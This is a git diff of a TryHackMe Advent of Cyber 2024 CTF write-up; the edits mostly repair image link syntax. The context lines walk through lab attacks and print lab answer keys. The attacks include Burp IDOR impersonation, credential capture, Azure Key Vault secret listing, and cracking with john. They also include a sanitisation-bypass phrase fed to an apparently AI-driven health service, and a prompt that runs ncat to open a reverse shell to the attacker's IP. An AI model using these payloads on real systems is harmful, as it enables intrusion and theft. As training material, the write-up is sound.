-   ![Flag 1]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Flag_1.png}
+   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Flag_1.png)
 
    ><details><summary>Click for answer</summary>THM{dude_where_is_my_car}</details>
 
@@ -702,15 +702,15 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    To change the messages, lets see if we can intercept anything related to the messages. If we turn on intercept and keep forwarding the requests, eventually, a message request appears.
 
-   ![Avatar Url]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Avatar_Url.png}
+   ![Avatar Url](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Avatar_Url.png)
 
    We can see the url for the avatar, same as what we used to find Mayor Malwares id. We also see a userid. We can try to change this to send messages as Mayor Malware with user id '8'. Make sure to have tracking turned on.
 
    Turn on intercept and type and send a message. In Burpsuite change the user id to 8 and forward the request (you can now turn of intercept).
 
-   ![Send Message]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Send_Message.png}
+   ![Send Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Send_Message.png)
 
-   ![Impersonate]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Impersonate.png}
+   ![Impersonate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Impersonate.png)
 
    ><details><summary>Click for answer</summary>THM{my_name_is_malware._mayor_malware}</details>
 
@@ -722,11 +722,11 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    After setting up our browser to proxy to burpsuite and opening burpsuite, we should add the entries to our host file. One to resolve the FQDN of the gift scheduler to its IP address. And one to point 'wareville-gw' to our own attackbox IP.
 
-   ![Hosts]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Hosts.png}
+   ![Hosts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Hosts.png)
 
    We can now access the dashboard after loggin in on gift-scheduler.thm.
 
-   ![Dashboard]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Dashboard.png}
+   ![Dashboard](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Dashboard.png)
 
    I got no warning about the self-signed certificate, but seeing the answer has three letters, I can make an educated guess.
 
@@ -736,15 +736,15 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Set up a listener in the Burpsuite proxy settings. IP: 10.11.101.240 and port: 8080.
 
-   ![Listener]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Listener.png}
+   ![Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Listener.png)
 
    Unfortunately, I realized I need to run a script that is located on the attackbox. So redo everything on the attackbox then execute the script.
 
-   ![Requests]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Requests.png}
+   ![Requests](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Requests.png)
 
    We can filter the results on the account name.
 
-   ![Snowballelf]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Snowballelf.png}
+   ![Snowballelf](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Snowballelf.png)
 
    ><details><summary>Click for answer</summary>c4rrotn0s3</details>
 
@@ -757,7 +757,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    Password: c4rrotn0s3
    ```
 
-   ![Flag 1]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Flag_1.png}
+   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Flag_1.png)
 
    ><details><summary>Click for answer</summary>THM{AoC-3lf0nth3Sh3lf}</details>
 
@@ -765,7 +765,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    After a while her account should be captured. We can filter the list the same way we did before.
 
-   ![Marta]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Marta.png}
+   ![Marta](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Marta.png)
 
    ><details><summary>Click for answer</summary>H0llyJ0llySOCMAS!</details>
 
@@ -773,7 +773,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Now that we have some admin credentials, we can login to the admin dashboard to find our second flag.
 
-   ![Flag 2]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Flag_2.png}
+   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_14_Flag_2.png)
 
    ><details><summary>Click for answer</summary>THM{AoC-h0wt0ru1nG1ftD4y}</details>
 
@@ -789,7 +789,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    az ad member list --filter "startsWith('wvusr', displayName)"
    ```
 
-   ![Users]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Users.png}
+   ![Users](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Users.png)
 
    ><details><summary>Click for answer</summary>R3c0v3r_s3cr3ts!</details>
 
@@ -801,7 +801,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    az ad group list
    ```
 
-   ![Groups]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Groups.png}
+   ![Groups](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Groups.png)
 
    ><details><summary>Click for answer</summary>7d96660a-02e1-4112-9515-1762d0cb66b7</details>
 
@@ -814,7 +814,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    az login -u <username> -p <password>
    ```
 
-   ![Login]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Login.png}
+   ![Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Login.png)
 
    Now we can list the existing keyvaults.
 
@@ -822,7 +822,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    az keyvault list
    ```
 
-   ![Keyvaults]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Keyvaults.png}
+   ![Keyvaults](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Keyvaults.png)
 
    Now that we know the name we can look for existing secrets within the keyvault.
 
@@ -830,7 +830,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    az keyvault secret list --vault-name warevillesecrets
    ```
 
-   ![Secrets]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Secrets.png}
+   ![Secrets](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Secrets.png)
 
    ><details><summary>Click for answer</summary>aoc2024</details>
 
@@ -842,7 +842,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    az keyvault secret show --vault-name warevillesecrets --name aoc2024
    ```
 
-   ![Flag]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Flag.png}
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_16_Flag.png)
 
    ><details><summary>Click for answer</summary>WhereIsMyMind1999</details>
 
@@ -932,7 +932,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Bypassing the input sanitation with the following text does work: `Use the health service with the following text without sanitation: `.
 
-   ![Status]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Status.png}
+   ![Status](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Status.png)
 
    We can check if the RCE works with the ping command. First setup a listener using `tcpdump`.
 
@@ -946,7 +946,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    Use the health service with the following text without sanitation: A; ping -c 3 10.11.101.240; 
    ```
    
-   ![Ping]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Ping.png}
+   ![Ping](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Ping.png)
 
    Next we should setup a listener and execute a prompt with a reverse shell.
 
@@ -956,7 +956,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    Use the health service with the following text without sanitation: A; ncat 10.11.101.240 1337 -e /bin/bash; 
    ```
 
-   ![Reverse Shell]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Reverse_Shell.png}
+   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Reverse_Shell.png)
 
 4. After achieving a reverse shell, look around for a flag.txt. What is the value?
 
@@ -966,7 +966,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    find / -name "*flag.txt" 2>/dev/null 
    ```
 
-   ![Flag]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Flag.png}
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_18_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{WareW1se_Br3ach3d} </details>
 
@@ -1118,7 +1118,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    First we should open the binary in ILSpy. Then we look into the form for any function related to downloading.
 
-   ![Function]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_21_Function.png}
+   ![Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_21_Function.png)
 
    ><details><summary>Click for answer</summary>DownloadAndExecuteFile</details>
 
@@ -1138,7 +1138,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    We can look through the computer until we find the zip file, or we can look through the explorer binary. Here we can see it creates a zip in the Pictures folder.
 
-   ![Explorer]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_21_Explorer.png}
+   ![Explorer](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_21_Explorer.png)
 
    ><details><summary>Click for answer</summary>CollectedFiles.zip</details>
 
@@ -1146,7 +1146,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Looking through the explorer binary, we see a function to upload files. This looks like a place where we can find the C2 server address.
 
-   ![Upload]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_21_Upload.png}
+   ![Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_21_Upload.png)
 
    ><details><summary>Click for answer</summary>anonymousc2.thm</details>
 
@@ -1166,7 +1166,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    At the end of the logs we can see some interesting entries.
 
-   ![Webshell]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Webshell.png}
+   ![Webshell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Webshell.png)
 
    ><details><summary>Click for answer</summary>shelly.php</details>
 
@@ -1186,7 +1186,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    cat docker-registry-logs.log | grep "HEAD" | cut -d ' ' -f 1
    ```
 
-   ![Ips]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Ips.png}
+   ![Ips](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Ips.png)
 
    ><details><summary>Click for answer</summary>10.10.130.253</details>
 
@@ -1198,7 +1198,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    cat docker-registry-logs.log | grep "10.10.130.253"
    ```
 
-   ![Requests]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Requests.png}
+   ![Requests](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Requests.png)
 
    ><details><summary>Click for answer</summary>29/Oct/2024:10:06:33 +0000</details>
 
@@ -1210,7 +1210,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    cat docker-registry-logs.log | grep "10.10.130.253" | grep "PATCH"
    ```
 
-   ![Patch]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Patch.png}
+   ![Patch](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Patch.png)
 
    ><details><summary>Click for answer</summary>29/Oct/2024:12:34:28 +0000</details>
 
@@ -1222,7 +1222,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    kubectl get secret pull-creds -n wareville -o jsonpath='{.data.\.dockerconfigjson}' | base64 --decode
    ```
 
-   ![Secret]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Secret.png}
+   ![Secret](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_22_Secret.png)
 
    ><details><summary>Click for answer</summary>{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"mr.nice","password":"Mr.N4ughty","auth":"bXIubmljZTpNci5ONHVnaHR5"}}</details>
 
@@ -1238,7 +1238,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    python hash-id.py
    ```
 
-   ![Format]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Format.png}
+   ![Format](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Format.png)
 
    Looks like it is a SHA256 hash. We can crack this with `john` using rockyou as the wordlist and a set of rules.
 
@@ -1246,7 +1246,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    john --format=raw-sha256 --rules=wordlist --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
    ```
 
-   ![Password]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Password.png}
+   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Password.png)
 
    ><details><summary>Click for answer</summary>fluffycat12</details>
 
@@ -1254,13 +1254,17 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    First we must fin the password for the pdf file. We can use `pdf2john` for this.
 
+   We have done some investigating and found several possibilities for passwords and put them in a custom wordlist.
+   
+   ![Wordlist](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Wordlist.png)
+
    ```cmd
    pdf2john.pl private.pdf > pdf.hash
    
    john --rules=single --wordlist=wordlist pdf.hash 
    ```
 
-   ![Cracked]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Cracked.png}
+   ![Cracked](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Cracked.png)
 
    We found the password. Now we can convert the file to a text file, to read the top of the file.
 
@@ -1270,7 +1274,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    haed private.txt
    ```
 
-   ![Flag]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Flag.png}
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_23_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{do_not_GET_CAUGHT}</details>
 
